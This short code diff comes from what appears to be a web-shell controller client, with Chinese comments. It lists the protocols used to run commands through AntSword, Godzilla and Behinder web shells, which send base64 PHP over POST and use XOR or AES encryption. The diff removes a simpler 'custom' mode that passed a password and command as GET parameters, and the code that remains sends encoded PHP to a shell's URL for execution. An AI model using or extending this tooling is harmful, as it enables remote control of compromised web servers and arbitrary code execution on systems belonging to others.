@@ -102,7 +102,6 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
 
   /**
    * WebShell 命令执行（完整协议）：
-   * - custom：GET ?cmd= 参数模式（基础一句话）
    * - antsword：POST shell=<base64 PHP 代码> 执行任意 PHP
    * - godzilla：XOR+base64（PHP）或 AES-ECB（JSP）加密协议 + session 会话
    * - behinder：AES-128-CBC（默认）或 XOR 协议 + func|params 格式
@@ -132,14 +131,6 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
       const enc = antSwordPhpEncode(phpCode)
       const sep = w.url.includes('?') ? '&' : '?'
       const r = await this.request(w, 'POST', w.url + sep + 'id=1', `shell=${encodeURIComponent(enc)}`, 'application/x-www-form-urlencoded')
-      return r.body.toString(w.encoding || 'utf8').trim()
-    }
-
-    // ---- custom：GET ?pwd=<密码>&cmd= 参数模式（生成的 shell 带 pwd 认证） ----
-    if (w.type === 'custom') {
-      u.searchParams.set('pwd', w.password || 'pass')
-      u.searchParams.set('cmd', command)
-      const r = await this.request(w, 'GET', u.href)
       return r.body.toString(w.encoding || 'utf8').trim()
     }
 
